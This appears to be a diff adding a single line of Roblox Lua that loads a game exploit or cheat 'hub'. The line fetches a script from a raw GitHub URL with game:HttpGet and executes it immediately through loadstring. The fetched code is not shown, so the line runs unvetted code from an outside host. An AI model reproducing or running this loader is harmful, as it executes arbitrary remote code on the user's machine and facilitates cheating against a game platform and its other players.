@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/princeaamir0913-droid/hood-omni-hub/main/later-version.lua"))()
